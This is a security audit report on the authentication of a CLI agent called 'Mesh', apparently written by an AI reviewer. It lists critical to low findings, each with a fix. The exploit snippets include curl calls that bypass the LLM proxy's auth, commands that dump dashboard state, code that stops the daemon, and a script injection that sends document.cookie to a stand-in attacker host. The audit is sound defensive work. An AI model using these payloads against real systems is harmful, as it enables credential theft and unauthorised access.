# Authentication & Sign-In Security Review

**Reviewed:** 2026-04-28T00:00:00Z
**Scope:** Full auth flow — startup, session restore, token storage, daemon, dashboard, runtime API
**Files Reviewed:** `src/auth.ts`, `src/index.ts`, `src/config.ts`, `src/dashboard-server.ts`, `src/daemon.ts`, `src/daemon-protocol.ts`, `src/runtime-api.ts`, `src/llm-client.ts`, `src/agent-loop.ts`, `src/session-capsule-store.ts`, `src/mesh-portal.ts`

---

## Auth Flow Overview (for context)

```
mesh (CLI)
  └─ index.ts: main()
       └─ auth.ensureAuthenticated()          ← Supabase session restore or interactive login
            └─ supabase.auth.setSession()      ← SERVER-SIDE token validation (correct)
                  OK → user object returned
                  │
                  void user;                   ← Identity discarded, never used downstream
                  │
                  AgentLoop → BedrockLlmClient → BEDROCK_ENDPOINT proxy
                                                  (Supabase token NOT forwarded to proxy)

mesh daemon (separate process, no auth gate)
mesh dashboard-server (separate process, no auth gate, HTTP)
MeshRuntime / runtime-api.ts (library entrypoint, no auth gate)
```

---

## Findings

### CRITICAL — C1: Supabase Access Token Is Never Forwarded to the LLM Proxy — Auth Provides No Access Control

**File:** `src/auth.ts:158-160`, `src/llm-client.ts:110-115`, `src/index.ts:31-32`

**Issue:**
`ensureAuthenticated()` performs a real server-side login via Supabase and returns a `MeshUser`. However, `index.ts` immediately discards the user with `void user;` (line 32). The resulting `AuthManager` instance is never consulted again — `getAccessToken()` is never called. The `BedrockLlmClient` only sets an `Authorization: Bearer` header when `options.bearerToken` is populated (line 113-115 of `llm-client.ts`), which comes from the BYOK env vars (`AWS_BEARER_TOKEN_BEDROCK`, etc.), not from the Supabase session.

**Consequence:** The Supabase login gate is completely decorative. An attacker who wants to use the Mesh LLM proxy (`https://mesh-llm.edgar-baumann.workers.dev`) does not need a valid Mesh account — they can bypass the login entirely by invoking the Cloudflare Worker directly. The CLI auth gate protects nothing at the infrastructure layer. Additionally, any user who can set `BEDROCK_ENDPOINT` to their own server receives all LLM request bodies (full conversation context, tool results, file contents) from any other user who points at that endpoint.

**Exploit:**
```bash
# Bypass the CLI auth gate entirely — call the LLM proxy directly with no Mesh credentials:
curl -X POST https://mesh-llm.edgar-baumann.workers.dev/model/us.anthropic.claude-sonnet-4-5-20250929-v1:0/converse \
  -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":[{"text":"hello"}]}],"inferenceConfig":{"maxTokens":100}}'

# Or hijack another user's LLM calls (if they use a shared/corporate endpoint):
BEDROCK_ENDPOINT=https://attacker.example.com mesh "summarize my codebase"
```

**Fix:** Pass the Supabase `access_token` as a bearer credential on every LLM proxy request, and validate it server-side in the Cloudflare Worker. In the CLI:

```typescript
// src/index.ts
const user = await auth.ensureAuthenticated();
// ...
const agent = new AgentLoop(config, backend, auth.getAccessToken()); // pass token

// src/llm-client.ts — use it as Authorization header if no BYOK token is set:
const supabaseToken = this.options.supabaseToken;
if (this.options.bearerToken) {
  headers.authorization = `Bearer ${this.options.bearerToken}`;
} else if (supabaseToken) {
  headers.authorization = `Bearer ${supabaseToken}`;
}
```

---

### CRITICAL — C2: Dashboard HTTP Server Has No Authentication on Any Endpoint

**File:** `src/dashboard-server.ts:88-144`, specifically lines 101-103 and 111-127

**Issue:**
The dashboard server binds to `127.0.0.1` on a random port and writes the port to `{workspace}/.mesh/dashboard/server.json`. There is zero authentication on any endpoint:

- `GET /health` — no auth, returns server version
- `GET /api/state` — no auth, returns full workspace state (file tree, engineering memory, repair queue, ghost profile, causal insights, artifact index, events log — everything)
- `POST /api/actions` — has an Origin check (`if (origin) { ... }`), but **only if** the `Origin` header is present. Any HTTP client that omits `Origin` (curl, Python's `requests`, `net.createConnection`, any non-browser) passes through without restriction and can execute workspace actions (`repair`, `causal`, `lab`, `twin`, `ghost_learn`)

Any process running on the local machine — malicious npm package, compromised VS Code extension, any subprocess — can read `server.json`, discover the port, and:
1. Exfiltrate the full workspace state (all file metadata, memory rules, event history)
2. Trigger destructive workspace analysis operations

**Exploit:**
```bash
# Step 1: discover port
PORT=$(cat /path/to/project/.mesh/dashboard/server.json | python3 -c "import sys,json; print(json.load(sys.stdin)['port'])")

# Step 2: dump full workspace state (no auth needed)
curl http://127.0.0.1:$PORT/api/state

# Step 3: trigger a workspace action with no Origin header (bypasses the origin check)
curl -X POST http://127.0.0.1:$PORT/api/actions \
  -H "Content-Type: application/json" \
  -d '{"action":"twin"}'
```

**Fix:** Generate a random secret token at server startup, write it to `server.json` alongside the port, and require it as a header on all requests:

```typescript
// At startup
const secret = crypto.randomBytes(32).toString("hex");
await fs.writeFile(serverInfoPath, JSON.stringify({ port, pid, secret, ... }), { mode: 0o600 });

// In request handler (before all route checks)
const provided = req.headers["x-mesh-token"];
if (provided !== secret) {
  res.writeHead(401);
  return res.end(JSON.stringify({ ok: false, error: "Unauthorized" }));
}
```

---

### CRITICAL — C3: Daemon Unix Socket Has No Authentication — Any Local Process Can Stop or Query the Daemon

**File:** `src/daemon.ts:124-148`, `src/daemon-protocol.ts:4-7`

**Issue:**
The daemon listens on a Unix domain socket at `~/.mesh/daemon.sock`. The socket is created with no explicit permission restrictions (no `chmod` after `server.listen()`). On Linux, Unix sockets created by `net.createServer().listen()` inherit `umask`, typically resulting in world-readable/writable permissions (0o666 after umask). Any process running as any user on the machine (or any process running as the same user) can connect and send any `DaemonAction`: `status`, `digest`, `stop`, or `ping`.

The `stop` action (line 134-140) triggers `process.exit(0)` — killing the daemon. An unprivileged malicious process can silently stop the daemon at any time.

**Exploit:**
```javascript
// From any Node.js process on the system:
const net = require("net");
const socket = net.createConnection("/Users/victim/.mesh/daemon.sock");
socket.write(JSON.stringify({ action: "stop" }));  // kills the daemon
```

**Fix:** After binding, restrict socket permissions, and validate caller identity:

```typescript
// After server.listen():
server.listen(DAEMON_SOCKET_PATH, () => {
  fs.chmod(DAEMON_SOCKET_PATH, 0o600);  // owner-only
  resolve();
});
```

For stronger protection, compare the connecting process's UID against the daemon's UID using the `SO_PEERCRED` option (available on Linux) or a challenge-response nonce written to a file only the owner can read.

---

### HIGH — H1: `MeshRuntime` (Public Library API) Has No Auth Gate

**File:** `src/runtime-api.ts:53-73`

**Issue:**
`createMeshRuntime()` is the public programmatic entry point for the agent. It calls `loadConfig()` and instantiates a full `AgentLoop` with file system access, shell execution, and LLM calls — with no call to `AuthManager.ensureAuthenticated()` at any point. Any code that imports this module (a compromised dependency, a test, an internal tool) gets a fully operational agent with no authentication.

This is a separate attack surface from the CLI. The `MeshRuntime` API is exported from the package and can be used in automation scripts, CI pipelines, or third-party integrations — all without any Supabase authentication.

**Exploit:**
```typescript
// Any Node.js script can use the full agent without ever logging in:
import { createMeshRuntime } from "mesh-agent-cli";
const rt = await createMeshRuntime({ workspaceRoot: "/target/workspace" });
await rt.runTurn("delete everything in src/ and push to main");
```

**Fix:** Add an auth parameter to `createMeshRuntime` and call `ensureAuthenticated()` (or at minimum validate an API key) before constructing the runtime:

```typescript
export async function createMeshRuntime(
  options: MeshRuntimeOptions & { apiKey?: string }
): Promise<MeshRuntime> {
  if (!options.apiKey) {
    const auth = new AuthManager();
    await auth.ensureAuthenticated();
  }
  // ...
}
```

---

### HIGH — H2: Session File Contains Full JWT in Plaintext with Group-Readable `settings.json`

**File:** `src/config.ts:196-200`, confirmed by `ls -la ~/.config/mesh/`

**Issue:**
`saveUserSettings()` writes `settings.json` — which may contain `customApiKey` (a BYOK LLM API key or Bedrock token) — with no `mode` restriction. The file is created as `-rw-r--r--` (0o644), making it readable by all users in the same group and by world on some systems.

The actual session file (`~/.config/mesh/session.json`) is correctly protected at `0o600`. However, `settings.json` at `~/.config/mesh/settings.json` (0o644 on disk) is not. If a user has stored a `customApiKey` via settings, that key is exposed to group members.

**Exploit:**
```bash
# On a multi-user system or shared CI box:
cat /home/victim/.config/mesh/settings.json
# Output includes: "customApiKey": "sk-ant-api03-..."
```

**Fix:**
```typescript
// src/config.ts:199
await fs.writeFile(SETTINGS_PATH, JSON.stringify(settings, null, 2), { encoding: "utf-8", mode: 0o600 });
```

Also ensure the parent directory is created with restricted permissions:
```typescript
await fs.mkdir(dir, { recursive: true, mode: 0o700 });
```

---

### HIGH — H3: `isSessionShape` Validator Accepts Any String as a Valid JWT — No Structural Validation

**File:** `src/auth.ts:34-41`

**Issue:**
`isSessionShape` checks only that the parsed JSON is an object with an `access_token` property that is a string. It does not check:
- That the string is a plausible JWT (three dot-separated base64url segments)
- That `expires_at` or `expires_in` exist and are in the future
- That a `user` object with an `email` is present

This means a crafted `session.json` containing `{"access_token": "anything"}` passes `isSessionShape` and is handed directly to `supabase.auth.setSession()`. While Supabase's server will reject an invalid JWT, this still opens a local file manipulation attack: if an attacker can write to `~/.config/mesh/session.json` (which requires local file access, so same-user or misconfigured permissions), they can inject any string and force a Supabase API call with attacker-controlled data.

More practically, if `supabase.auth.setSession()` ever changes its behavior or if the codebase is adapted to a different auth backend, this thin validator becomes a direct bypass path.

**Fix:**
```typescript
function isSessionShape(obj: unknown): obj is Omit<Session, "refresh_token"> & { refresh_token?: string } {
  if (typeof obj !== "object" || obj === null) return false;
  const o = obj as Record<string, unknown>;
  const token = o.access_token;
  if (typeof token !== "string") return false;
  // Require JWT structure: three base64url segments separated by dots
  if (!/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(token)) return false;
  // Require non-expired token
  const expiresAt = Number(o.expires_at);
  if (Number.isFinite(expiresAt) && expiresAt * 1000 < Date.now()) return false;
  return true;
}
```

---

### HIGH — H4: `MeshPortal` Executes Arbitrary JavaScript in a Browser Context via Unsanitized Inputs

**File:** `src/mesh-portal.ts:68-69`, `src/mesh-portal.ts:72-75`

**Issue:**
`MeshPortal.evaluate(expression: string)` passes `expression` directly to `Runtime.evaluate` via Chrome DevTools Protocol with no sanitization. `applyGhostStyles(styles)` serializes user-controlled `styles` with `JSON.stringify` and injects it into an `evaluate` call:

```typescript
await this.evaluate(`window.__mesh_apply_ghost(${json})`);
```

If `styles` contains a value that breaks out of the JSON string context — e.g. via a key or value containing backticks, string injection, or if `JSON.stringify` produces unexpected output for non-plain-object inputs — this is a code injection into the browser's execution context. More broadly, callers of `evaluate()` can pass arbitrary JS expressions, and there is no allowlist, sandbox, or CSP to restrict what the injected code can access (including `localStorage`, `document.cookie`, Chrome extension storage, etc.).

**Exploit:**
```typescript
// If an LLM tool call provides styles with crafted content:
await portal.applyGhostStyles({
  "background": "red); window.open('http://exfil.attacker.com?d='+document.cookie, '_blank'); (1+1"
});
// The resulting evaluate call becomes:
// window.__mesh_apply_ghost({"background":"red); window.open(..."}
```

**Fix:** Do not use string interpolation for CDP `Runtime.evaluate` calls. Pass data as a structured argument using `Runtime.callFunctionOn` with a serialized argument list, which is immune to injection:

```typescript
async applyGhostStyles(styles: Record<string, string>): Promise<void> {
  await this.cdpClient?.send("Runtime.callFunctionOn", {
    functionDeclaration: "function(styles) { window.__mesh_apply_ghost(styles); }",
    arguments: [{ value: styles }],
    returnByValue: true
  });
}
```

---

### MEDIUM — M1: `BEDROCK_ENDPOINT` and `customEndpoint` Accept Arbitrary URLs — Conversation Data Exfiltration

**File:** `src/config.ts:233`, `src/llm-client.ts:236`

**Issue:**
Both `BEDROCK_ENDPOINT` (env var) and `customEndpoint` (from `settings.json` or `localSettings`) are accepted as-is with no URL validation, allowlist, or TLS-only enforcement. The LLM client constructs requests to `${endpointBase}/model/${modelId}/converse` and sends the full conversation (system prompt, all messages, file contents, tool results) to that URL.

An attacker who can set this value — via `.mesh/config.json` in a malicious repository, via a compromised `settings.json`, or via a `.env` file — can redirect all LLM traffic (including codebase contents, secrets read from files, tool outputs) to an attacker-controlled server.

This is a supply-chain / workspace-trust issue: cloning a malicious repository that contains `.mesh/config.json` with `"customEndpoint": "https://attacker.com"` will silently exfiltrate everything.

**Fix:**
```typescript
function validateEndpointUrl(raw: string): string {
  const url = new URL(raw); // throws if malformed
  if (url.protocol !== "https:" && !isLocalhost(url)) {
    throw new Error(`BEDROCK_ENDPOINT must use HTTPS. Got: ${raw}`);
  }
  return url.toString();
}
```

Also consider: do not load `customEndpoint` from workspace-local `.mesh/config.json` — only from the user's global `~/.config/mesh/settings.json`, which is under the user's control.

---

### MEDIUM — M2: Dashboard `POST /api/actions` Origin Check Is Trivially Bypassed

**File:** `src/dashboard-server.ts:111-127`

**Issue:**
The cross-origin protection on `POST /api/actions` only runs when the `Origin` header is present:

```typescript
const origin = req.headers["origin"];
if (origin) {
  // validate...
}
// If no Origin header: falls through to enqueueAction() immediately
```

Browsers send `Origin` on cross-origin requests. But `curl`, Python's `requests`, Node.js `http`, and any local process do not send `Origin` by default. The check therefore provides no protection against local attacker processes — which are the realistic threat model for a localhost HTTP server. The entire purpose of the check is defeated.

**Fix:** Invert the logic — require a secret token (see C2 fix) instead of relying on Origin-based CSRF protection, which cannot be relied upon for non-browser clients.

---

### MEDIUM — M3: `dashboard-server.ts` Content-Security-Policy Allows `unsafe-inline`

**File:** `src/dashboard-server.ts:152`

```typescript
"Content-Security-Policy": "default-src 'self' 'unsafe-inline'; img-src 'self' data:;"
```

**Issue:**
`'unsafe-inline'` permits execution of inline `<script>` blocks and inline event handlers. The dashboard renders workspace data into HTML via an `esc()` function, but the presence of `unsafe-inline` means that if any XSS vector exists (e.g., in an artifact name, event message, file path, or memory rule that reaches the DOM), script injection is directly possible. The dashboard also loads fonts from `fonts.googleapis.com`, but the CSP `default-src 'self'` blocks that — meaning the font link will be CSP-blocked in browsers that enforce it, while the `unsafe-inline` defeats the main injection protection.

**Fix:**
```typescript
// Use a nonce-based approach instead:
const nonce = crypto.randomBytes(16).toString("base64");
"Content-Security-Policy": `default-src 'self'; script-src 'nonce-${nonce}'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:;`
// Then add nonce="${nonce}" to the <script> tag
```

---

### LOW — L1: Daemon Socket Path Has World-Predictable Location and No Lockfile Race Protection

**File:** `src/daemon.ts:74`, `src/daemon-protocol.ts:5`

```typescript
await fs.rm(DAEMON_SOCKET_PATH, { force: true }).catch(() => undefined);
await fs.writeFile(DAEMON_PID_PATH, String(process.pid), "utf8");
```

**Issue:**
The daemon deletes the socket file and re-creates it without any exclusive lock. A time-of-check to time-of-use (TOCTOU) race exists: between the `fs.rm` on line 74 and `server.listen()` on line 146, another process can create a socket at `~/.mesh/daemon.sock`. The daemon will then fail to bind, while the attacker's socket sits at that path ready to receive daemon queries.

Also, `~/.mesh/` is created with `{ recursive: true }` (line 73 of `daemon.ts`) but with no explicit `mode`, inheriting the default umask-derived permissions.

**Fix:** Create `~/.mesh/` with `mode: 0o700`, and use an advisory lock file (e.g., open with `O_CREAT | O_EXCL`) to prevent concurrent daemon starts.

---

### LOW — L2: Authenticated User Identity Is Obtained but Never Used for Resource Isolation

**File:** `src/index.ts:31-32`

```typescript
const user = await auth.ensureAuthenticated();
void user; // available for per-user features (e.g. namespaced capsule cache)
```

**Issue:**
The `user.id` UUID is available after authentication but is deliberately discarded. All shared resources — session capsule store (`~/.config/mesh/sessions/`), `settings.json`, engineering memory — are stored in user-global paths with no per-account namespacing. On a shared machine with multiple Mesh accounts (or in future multi-tenant use), one authenticated user's data would collide with another's. The comment acknowledges this as a known gap ("available for per-user features") but it represents a missing authz layer.

**Fix:** Pass `user.id` into `AgentLoop` and `SessionCapsuleStore` to namespace per-user storage under `~/.config/mesh/users/{userId}/`.

---

### LOW — L3: Refresh Token Falls Back to Plaintext in `session.json` if Keychain Is Unavailable

**File:** `src/auth.ts:63-65`

```typescript
const keychainToken = await keytar.getPassword(KEYCHAIN_SERVICE, KEYCHAIN_ACCOUNT);
const fallbackToken = stored.refresh_token ?? undefined;
const refreshToken = keychainToken || fallbackToken;
```

**Issue:**
When saving a session, the code correctly strips `refresh_token` from the on-disk JSON (line 153) and stores it in the OS keychain. However, when *loading*, `stored.refresh_token` is read as a fallback if `keytar` fails. This means: if a previously-stored session.json (from an older version or a different machine) happens to contain a `refresh_token` field, it will be used directly from the plaintext file. There is no warning to the user, and the fallback creates a silent downgrade from keychain security to file-based storage.

**Fix:** Remove the `fallbackToken` path entirely. If `keytar` fails and no keychain token is available, treat the session as expired and require re-authentication:

```typescript
const refreshToken = await keytar.getPassword(KEYCHAIN_SERVICE, KEYCHAIN_ACCOUNT);
// No fallback to stored.refresh_token — if keychain is unavailable, force re-login.
```

---

## Summary Table

| ID | Severity | File | Line(s) | Issue |
|----|----------|------|---------|-------|
| C1 | CRITICAL | `src/auth.ts`, `src/llm-client.ts`, `src/index.ts` | 158, 113, 32 | Supabase auth token never forwarded to LLM proxy — auth gate is purely cosmetic |
| C2 | CRITICAL | `src/dashboard-server.ts` | 101-127, 140 | Dashboard HTTP server has zero authentication on all endpoints |
| C3 | CRITICAL | `src/daemon.ts` | 124-148 | Daemon Unix socket has no auth — any local process can stop or query daemon |
| H1 | HIGH | `src/runtime-api.ts` | 53-73 | `MeshRuntime` public API has no auth gate |
| H2 | HIGH | `src/config.ts` | 196-200 | `settings.json` written without restricted file permissions (0o644, may contain API key) |
| H3 | HIGH | `src/auth.ts` | 34-41 | `isSessionShape` accepts any string as JWT — no structural or expiry validation |
| H4 | HIGH | `src/mesh-portal.ts` | 68-75 | CDP `evaluate()` executes unsanitized string interpolation — code injection in browser context |
| M1 | MEDIUM | `src/config.ts` | 233 | `BEDROCK_ENDPOINT`/`customEndpoint` accept arbitrary URLs — full conversation exfiltration |
| M2 | MEDIUM | `src/dashboard-server.ts` | 111-127 | Origin check bypass — missing `Origin` header skips CSRF protection entirely |
| M3 | MEDIUM | `src/dashboard-server.ts` | 152 | CSP uses `unsafe-inline` — negates injection protection if XSS vector exists |
| L1 | LOW | `src/daemon.ts` | 73-74 | TOCTOU race on daemon socket creation; `~/.mesh/` created with no explicit mode |
| L2 | LOW | `src/index.ts` | 31-32 | Authenticated user ID discarded — no per-user resource isolation |
| L3 | LOW | `src/auth.ts` | 63-65 | Refresh token falls back to plaintext `session.json` if keychain unavailable |

---

_Reviewed: 2026-04-28_
_Reviewer: Claude (security audit, manual trace)_
